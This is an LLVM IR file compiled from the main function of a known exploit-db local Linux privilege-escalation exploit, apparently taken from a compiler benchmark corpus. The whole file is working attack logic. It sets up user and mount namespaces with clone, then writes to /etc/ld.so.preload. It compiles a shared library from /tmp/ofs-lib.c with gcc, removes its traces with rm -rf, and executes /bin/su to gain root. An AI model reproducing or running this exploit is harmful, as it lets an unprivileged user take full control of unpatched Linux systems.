; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_37292.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_37292.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@CLONE_NEWNS = common dso_local global i32 0, align 4
@SIGCHLD = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [18 x i8] c"spawning threads\0A\00", align 1
@CLONE_NEWUSER = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [37 x i8] c"failed to create new user namespace\0A\00", align 1
@child_exec = common dso_local global i32 0, align 4
@child_stack = common dso_local global i64 0, align 8
@.str.2 = private unnamed_addr constant [38 x i8] c"failed to create new mount namespace\0A\00", align 1
@.str.3 = private unnamed_addr constant [20 x i8] c"child threads done\0A\00", align 1
@.str.4 = private unnamed_addr constant [19 x i8] c"/etc/ld.so.preload\00", align 1
@O_WRONLY = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [16 x i8] c"exploit failed\0A\00", align 1
@.str.6 = private unnamed_addr constant [28 x i8] c"/etc/ld.so.preload created\0A\00", align 1
@.str.7 = private unnamed_addr constant [25 x i8] c"creating shared library\0A\00", align 1
@.str.8 = private unnamed_addr constant [15 x i8] c"/tmp/ofs-lib.c\00", align 1
@O_CREAT = common dso_local global i32 0, align 4
@LIB = common dso_local global i8* null, align 8
@.str.9 = private unnamed_addr constant [60 x i8] c"gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w\00", align 1
@.str.10 = private unnamed_addr constant [33 x i8] c"couldn't create dynamic library\0A\00", align 1
@.str.11 = private unnamed_addr constant [17 x i8] c"/tmp/ofs-lib.so\0A\00", align 1
@.str.12 = private unnamed_addr constant [37 x i8] c"rm -rf /tmp/ns_sploit /tmp/ofs-lib.c\00", align 1
@.str.13 = private unnamed_addr constant [8 x i8] c"/bin/su\00", align 1
@.str.14 = private unnamed_addr constant [3 x i8] c"su\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i64, align 8
  %10 = alloca i64, align 8
  %11 = alloca i32, align 4
  %12 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %13 = load i32, i32* @CLONE_NEWNS, align 4
  %14 = load i32, i32* @SIGCHLD, align 4
  %15 = or i32 %13, %14
  store i32 %15, i32* %11, align 4
  %16 = load i32, i32* @stderr, align 4
  %17 = call i32 @fprintf(i32 %16, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str, i64 0, i64 0))
  %18 = call i64 (...) @fork()
  store i64 %18, i64* %9, align 8
  %19 = icmp eq i64 %18, 0
  br i1 %19, label %20, label %48

20:                                               ; preds = %2
  %21 = load i32, i32* @CLONE_NEWUSER, align 4
  %22 = call i64 @unshare(i32 %21)
  %23 = icmp ne i64 %22, 0
  br i1 %23, label %24, label %27

24:                                               ; preds = %20
  %25 = load i32, i32* @stderr, align 4
  %26 = call i32 @fprintf(i32 %25, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.1, i64 0, i64 0))
  br label %27

27:                                               ; preds = %24, %20
  %28 = call i64 (...) @fork()
  store i64 %28, i64* %10, align 8
  %29 = icmp eq i64 %28, 0
  br i1 %29, label %30, label %45

30:                                               ; preds = %27
  %31 = load i32, i32* @child_exec, align 4
  %32 = load i64, i64* @child_stack, align 8
  %33 = add nsw i64 %32, 1048576
  %34 = load i32, i32* %11, align 4
  %35 = call i64 @clone(i32 %31, i64 %33, i32 %34, i32* null)
  store i64 %35, i64* %12, align 8
  %36 = load i64, i64* %12, align 8
  %37 = icmp slt i64 %36, 0
  br i1 %37, label %38, label %42

38:                                               ; preds = %30
  %39 = load i32, i32* @stderr, align 4
  %40 = call i32 @fprintf(i32 %39, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.2, i64 0, i64 0))
  %41 = call i32 @exit(i32 -1) #3
  unreachable

42:                                               ; preds = %30
  %43 = load i64, i64* %12, align 8
  %44 = call i32 @waitpid(i64 %43, i32* %6, i32 0)
  br label %45

45:                                               ; preds = %42, %27
  %46 = load i64, i64* %10, align 8
  %47 = call i32 @waitpid(i64 %46, i32* %6, i32 0)
  store i32 0, i32* %3, align 4
  br label %91

48:                                               ; preds = %2
  %49 = call i32 @usleep(i32 300000)
  %50 = call i32 @wait(i32* null)
  %51 = load i32, i32* @stderr, align 4
  %52 = call i32 @fprintf(i32 %51, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.3, i64 0, i64 0))
  %53 = load i32, i32* @O_WRONLY, align 4
  %54 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.4, i64 0, i64 0), i32 %53)
  store i32 %54, i32* %7, align 4
  %55 = load i32, i32* %7, align 4
  %56 = icmp eq i32 %55, -1
  br i1 %56, label %57, label %61

57:                                               ; preds = %48
  %58 = load i32, i32* @stderr, align 4
  %59 = call i32 @fprintf(i32 %58, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.5, i64 0, i64 0))
  %60 = call i32 @exit(i32 -1) #3
  unreachable

61:                                               ; preds = %48
  %62 = load i32, i32* @stderr, align 4
  %63 = call i32 @fprintf(i32 %62, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.6, i64 0, i64 0))
  %64 = load i32, i32* @stderr, align 4
  %65 = call i32 @fprintf(i32 %64, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.7, i64 0, i64 0))
  %66 = load i32, i32* @O_CREAT, align 4
  %67 = load i32, i32* @O_WRONLY, align 4
  %68 = or i32 %66, %67
  %69 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.8, i64 0, i64 0), i32 %68, i32 511)
  store i32 %69, i32* %8, align 4
  %70 = load i32, i32* %8, align 4
  %71 = load i8*, i8** @LIB, align 8
  %72 = load i8*, i8** @LIB, align 8
  %73 = call i32 @strlen(i8* %72)
  %74 = call i32 @write(i32 %70, i8* %71, i32 %73)
  %75 = load i32, i32* %8, align 4
  %76 = call i32 @close(i32 %75)
  %77 = call i32 @system(i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.9, i64 0, i64 0))
  store i32 %77, i32* %8, align 4
  %78 = load i32, i32* %8, align 4
  %79 = icmp ne i32 %78, 0
  br i1 %79, label %80, label %84

80:                                               ; preds = %61
  %81 = load i32, i32* @stderr, align 4
  %82 = call i32 @fprintf(i32 %81, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.10, i64 0, i64 0))
  %83 = call i32 @exit(i32 -1) #3
  unreachable

84:                                               ; preds = %61
  %85 = load i32, i32* %7, align 4
  %86 = call i32 @write(i32 %85, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.11, i64 0, i64 0), i32 16)
  %87 = load i32, i32* %7, align 4
  %88 = call i32 @close(i32 %87)
  %89 = call i32 @system(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.12, i64 0, i64 0))
  %90 = call i32 @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.13, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i64 0, i64 0), i32* null)
  br label %91

91:                                               ; preds = %84, %45
  %92 = load i32, i32* %3, align 4
  ret i32 %92
}

declare dso_local i32 @fprintf(i32, i8*) #1

declare dso_local i64 @fork(...) #1

declare dso_local i64 @unshare(i32) #1

declare dso_local i64 @clone(i32, i64, i32, i32*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @waitpid(i64, i32*, i32) #1

declare dso_local i32 @usleep(i32) #1

declare dso_local i32 @wait(i32*) #1

declare dso_local i32 @open(i8*, i32, ...) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @system(i8*) #1

declare dso_local i32 @execl(i8*, i8*, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
